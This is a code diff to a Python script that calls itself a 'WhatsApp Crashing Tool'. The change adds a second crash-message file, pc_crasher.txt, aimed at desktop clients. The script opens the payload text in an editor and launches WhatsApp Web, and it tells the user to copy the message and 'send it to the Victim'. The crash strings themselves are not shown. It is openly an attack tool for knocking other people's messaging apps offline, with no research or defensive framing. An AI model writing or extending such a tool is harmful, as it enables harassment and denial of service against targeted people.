@@ -7,22 +7,26 @@ except ModuleNotFoundError:
     print('Module is not installed\n')
     os.system('pip install hpcomt')
 print('\t\t\tWhatsApp Crashing Tool v1.1 By E4CRYTP3D')
-with open('crasher.txt', 'r') as r:
-    reading = r.readlines()
+with open('crasher.txt', 'r') as mobile:
+    reading = mobile.readlines()
     conv_str = str(reading)
     crashing_text = conv_str.strip("[]'")
+with open('pc_crasher.txt', 'r') as pc:
+    pc_reading = pc.readlines()
+    pc_string = str(pc_reading)
+    pc_crasher = pc_string.strip("[]'")
 
 def whatsapp_crashingmain():
     if hpcomt.Name() == 'Windows':
         print('Please Copy this message and login to your Whatsapp account by scanning the QRCODE and send it to the Victim')
         print('NOTE: PLEASE CLOSE THE NOTEPAD AFTER COPYING THE TEXT.')
-        os.system('notepad.exe crasher.txt')
+        os.system('notepad.exe pc_crasher.txt')
         time.sleep(3)
         webbrowser.open('https://web.whatsapp.com')
     elif hpcomt.Name() == 'Linux':
         print('Please Copy this message and login to your Whatsapp account by scanning the QRCODE and send it to the Victim')
         print('NOTE: PLEASE CLOSE THE VIM Editor AFTER COPYING THE TEXT.')
-        os.system('vim crasher.txt')
+        os.system('vim pc_crasher.txt')
         time.sleep(3)
         webbrowser.open('https://web.whatsapp.com')
     elif hpcomt.Name() == 'Android':
